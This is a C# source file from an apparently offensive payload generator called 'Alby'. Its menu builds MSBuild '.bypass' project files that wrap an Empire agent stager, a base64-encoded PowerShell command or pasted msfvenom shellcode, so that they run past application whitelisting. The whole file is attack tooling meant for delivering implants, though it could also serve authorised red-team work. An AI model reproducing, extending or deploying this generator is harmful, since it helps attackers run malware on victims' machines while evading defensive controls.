using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alby
{
   class MSBuild
   {
   
        public static void Menu()
        {
            Helpers.AlbyAddToBanner("MSBUILD.exe - Select Payload");
            Console.WriteLine(" 1. MSBuildShell");
            Console.WriteLine(" 2. Empire Agent");
            Console.WriteLine(" 3. Raw unencoded PowerShell command");
            Console.WriteLine(" 4. Metasploit payload");
            Console.WriteLine();
            Console.WriteLine(" 0. Back.");
            Console.Write("\nEnter choice: ");

            int UserInput = Helpers.GenerateInputOptions(4);
            switch (UserInput)
            {
                case 1:
                    MSBuildShell();
                    break;
                case 2:
                    Empire();    
                    break;
                case 3:
                    UnencodedPoshCommand();
                    break;
                case 4:
                    Metasploit();
                    break;
                default:
                    break;
            }
        }

        private static void MSBuildShell()
        {
            /* Default filename */
            string Filename_MSBuildShell_Default = "MSBuildShell.bypass";
            string Outfile = Helpers.FileFolderLocation(Filename_MSBuildShell_Default);
            Generators.GeneratePayload(Resources.Template_MSBuild_MSBuildShell, Outfile, null, "GenerateFile", null, null, null);
            Helpers.WriteMSBuildPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        private static void Empire()
        {
            /* Default filename */
            string Filename_MsbuildEmpireStager_Default = "MSBuildEmpireStager.bypass";

            Helpers.WriteEmpireExample();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Important! -->Only paste the base64 encoded string<--");
            Console.ResetColor();
            Console.WriteLine("Press Enter in an empty line to exit paste");
            string Empire_Stager = Helpers.PasteToString();

            /* Decode */
            string decoded = Encoding.Unicode.GetString(System.Convert.FromBase64String(Empire_Stager));
            /* Replace & with . due to a bug of somekind */
            string replaced = decoded.Replace("&", ".");
            Console.WriteLine();

            /* ENCODE */
            string base64string = Convert.ToBase64String(Encoding.UTF8.GetBytes(replaced));
            Console.WriteLine(base64string);
            Console.WriteLine();
            Empire_Stager = base64string;

            string Outfile = Helpers.FileFolderLocation(Filename_MsbuildEmpireStager_Default);
            Generators.GeneratePayload(Resources.Template_MSBuild_PowerShell, Outfile, Empire_Stager, "GenerateFile", null, null, null);
            Helpers.WriteMSBuildPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        private static void UnencodedPoshCommand()
        {
            string Filename_MsbuildUnencodedPowerShell_Default = "MSBuildUnencodedPowerShell.bypass";
            
            
            Console.WriteLine("Type in your unencoded PowerShell command");
            Console.WriteLine("");
            Console.WriteLine("Example: Get-service > c:\\test\\file.csv");
            Console.WriteLine("");
            Console.WriteLine("Press Enter in an empty line to exit paste");
            
            
            string Unencoded_PowerShell = Helpers.PasteToString();
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(Unencoded_PowerShell);
            Unencoded_PowerShell = System.Convert.ToBase64String(plainTextBytes);
            
            string Outfile = Helpers.FileFolderLocation(Filename_MsbuildUnencodedPowerShell_Default);
            Generators.GeneratePayload(Resources.Template_MSBuild_PowerShell, Outfile, Unencoded_PowerShell, "GenerateFile", null, null, null);
            Helpers.WriteMSBuildPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        private static void Metasploit()
        {
            // Default filename
            string Filename_MsbuildMetasploitPayload_Default = "MSBuildMetasploitPayload.bypass";
            
            Helpers.WriteMetasploitExample();
            
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Important! --Paste entire output from msfvenom, including byte[] buf and so on--");
            Console.ResetColor();
            Console.WriteLine("Press Enter in an empty line to exit...");
            
            string Metasploit_Payload = Helpers.PasteToString();
            string Outfile = Helpers.FileFolderLocation(Filename_MsbuildMetasploitPayload_Default);
            Generators.GeneratePayload(Resources.Template_MSBuild_Shellcode, Outfile, Metasploit_Payload, "GenerateFile", null, null, null);
            
            Helpers.WriteMSBuildPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        
    }
}
